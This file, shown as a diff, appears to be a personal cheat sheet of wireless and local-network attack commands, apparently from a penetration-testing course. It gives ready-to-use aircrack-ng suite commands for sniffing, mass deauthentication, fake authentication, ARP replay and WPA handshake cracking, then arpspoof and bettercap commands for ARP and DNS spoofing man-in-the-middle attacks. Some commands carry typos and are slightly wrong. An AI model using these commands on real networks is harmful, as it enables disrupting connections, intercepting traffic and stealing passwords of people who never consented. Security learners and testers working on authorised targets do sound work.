@@ -1,0 +1,50 @@
+--Pre connection attack--
+see the interface 
+airmon-ng check kill
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+
+--Specify the frequency--
+a (5G)
+b,g (2.4G)
+ex: airodump-ng --band a wlan0 
+
+
+--Packet sniffing--
+ex: airodump-ng --bssid 9E:94:2E:5E:9D:50 --channel 5 --write test1st wlan0
+
+
+---Deauthentication attack--
+ex: aireplay-ng --deauth 100000000 -a [router target mac] -c [client targermac] wlan0
+
+--Fake authentication attack--
+ex: aireplay-ng --fakeauth 30[associate every 30sec] -a [router targer mac] -h [our mac adapter] wlan0
+
+--ARP replay attack--
+ex: aireplay-ng --arpreplay -b [router targer mac] -h [our mac adapter] wlan0
+
+--Cracking with wordlist--
+ex: aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]
+
+--Cracking using PMK--
+ex: airolib-ng [db_name] --import passwd [wordlist]
+
+--ARP Spoof--
+ex:  arpspoof -i eth0 -t [IP Victim] [IP Router]    *to fool victim
+       arpspoof -i eth0 -t [IP Router] [IP Victim]    *to fool router
+port forwarding : echo 1 > /proc/sys/net/ipv4/ip_forward
+
+--Bettercap--
+run bettercap : bettercap -iface eth0
+view option : help
+run some option : net.probe on (net.show)
+view detailed module : help arp.spoof
+modify parameter :
+[set] [option name] [value]
+set arp.spoof.fullduplex true
+set.arp.spoof.targets [target IP] (IP,IP for multiple target)
+arp.spoof on
+run a caplet : bettercap -iface eth0 -caplet /root/spoof.cap 
+dns spoof : set dns.spoof.all true
